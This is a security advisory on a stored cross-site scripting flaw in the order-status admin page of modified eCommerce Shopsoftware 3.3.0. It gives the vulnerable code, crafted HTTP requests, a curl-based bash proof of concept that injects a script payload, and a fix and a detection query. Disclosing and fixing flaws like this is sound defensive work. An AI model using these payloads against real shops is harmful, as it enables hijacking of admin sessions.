# Security Advisory: Stored Cross-Site Scripting in admin/orders_status.php — Order Status Name Field (3× reflection)

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in `admin/orders_status.php`. The order status name field is saved via `xtc_db_prepare_input()` and subsequently echoed **three times** without HTML encoding on the status management page: in the table row, in the information box heading, and in the information box content area. An admin who creates or edits an order status with a crafted name can inject persistent JavaScript that executes in every admin's browser who views the order statuses page.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/orders_status.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Order status name is saved with `xtc_db_prepare_input($_POST['orders_status_name'][<lang_id>])`. When the status list is rendered, the name is echoed in multiple places without output encoding:

```php
// admin/orders_status.php:194–196 (approximate, simplified)
// 1st reflection — table cell:
echo $orders_status['orders_status_name'];

// 2nd reflection — infobox heading:
echo '<td class="infoBoxHeading">' . $orders_status['orders_status_name'] . '</td>';

// 3rd reflection — infobox content:
echo '<td class="infoBoxContent">' . $orders_status['orders_status_name'] . '</td>';
// All three: xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()
```

Three separate injection points means the payload executes three times per page load, increasing the attack surface for payload variations.

### Necessary Conditions

- **Authentication:** Admin (to create/edit an order status)
- **User interaction:** Required — any admin must view the order statuses page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session tokens, page DOM content accessible
- **Integrity:** Low — arbitrary admin actions via victim's session
- **Availability:** None

The triple reflection means even a filtered payload (e.g., via browser XSS filter, if applicable) has multiple independent opportunities to execute.

---

## 5. Classification

### CVSS

- **Score:** 4.8
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin A creates an order status with name: `<script>alert(document.cookie)</script>`
2. Payload stored in `orders_status` table without encoding.
3. Admin B visits the order statuses page.
4. Browser encounters the script tag in three separate locations and executes it.
5. Attacker captures Admin B's session for privilege escalation.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/orders_status.php (lines 194–196)
         Database table: orders_status (orders_status_name column)
Parameter(s): orders_status_name[<language_id>] (POST)
Method: POST · Authentication: Admin
```

### Example Request (inject payload)

```http
POST /admin/orders_status.php?action=insert HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<securityToken>=<CSRF_VALUE>&orders_status_name[1]=<script>alert(document.domain)</script>&orders_status_color=%23000000&orders_status_icon=&public_flag=1&downloads_flag=0
```

### Example Request (trigger)

```http
GET /admin/orders_status.php HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
```

### Observed Response

```html
HTTP/1.1 200 OK

<!-- 1st reflection: table row -->
<td class="dataTableContent"><script>alert(document.domain)</script></td>

<!-- 2nd reflection: infobox heading -->
<td class="infoBoxHeading"><script>alert(document.domain)</script></td>

<!-- 3rd reflection: infobox content -->
<td class="infoBoxContent"><script>alert(document.domain)</script></td>
```

### Result

Confirmed in authorized Docker lab (new session `f21b0bf517e7011f594b88f689436f81`). Order status saved with XSS payload. On subsequent page load, `alert(document.domain)` executed THREE times.

**Evidence:** `<script>alert(document.domain)</script>` appeared in HTTP response body in three separate HTML contexts (table cell, infobox heading, infobox content).

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V13 PoC — Stored XSS in admin/orders_status.php (3x reflection)
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/orders_status.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+')

echo "CSRF: $CSRF"

# Step 2: Insert order status with XSS payload
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "http://TARGET/admin/orders_status.php?action=insert" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'orders_status_name[1]=<script>alert(document.domain)</script>' \
  --data-urlencode 'orders_status_color=#FF0000' \
  --data-urlencode 'orders_status_icon=' \
  --data-urlencode 'public_flag=1' \
  --data-urlencode 'downloads_flag=0' \
  -o /dev/null

# Step 3: Retrieve orders_status page — count occurrences of payload
RESP=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/orders_status.php")

COUNT=$(echo "$RESP" | grep -c "alert(document.domain)")
echo "Payload reflections found: $COUNT"
# Expected: 3

# Verify DB persistence:
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT orders_status_id, orders_status_name FROM orders_status WHERE orders_status_name LIKE '%script%';" 2>/dev/null
```

### Expected Result

```text
Payload reflections found: 3

orders_status_id | orders_status_name
-----------------+--------------------------------------------
        <new_id> | <script>alert(document.domain)</script>
```

### PoC Limitations

- Alert-based PoC; no data exfiltration.
- Order status record can be deleted after testing.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Order Statuses → New Status.
3. Enter `<script>alert(1)</script>` in the Status Name field. Save.
4. Reload the orders statuses list — script executes three times.

---

## 10. Mitigation

- Encode all three output locations with `htmlspecialchars($orders_status['orders_status_name'], ENT_QUOTES, 'UTF-8')`.
- Validate status name input to disallow HTML special characters.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/orders_status.php — Vulnerable (all 3 occurrences):
echo $orders_status['orders_status_name'];

// Fixed (apply to all 3 occurrences):
echo htmlspecialchars($orders_status['orders_status_name'], ENT_QUOTES, 'UTF-8');
```

---

## 12. Detection and Indicators

- `orders_status.orders_status_name` column containing HTML tags.

### Example Log Search

```text
SELECT orders_status_id, orders_status_name 
FROM orders_status 
WHERE orders_status_name LIKE '%<%' OR orders_status_name LIKE '%>%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab (3× execution verified) |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
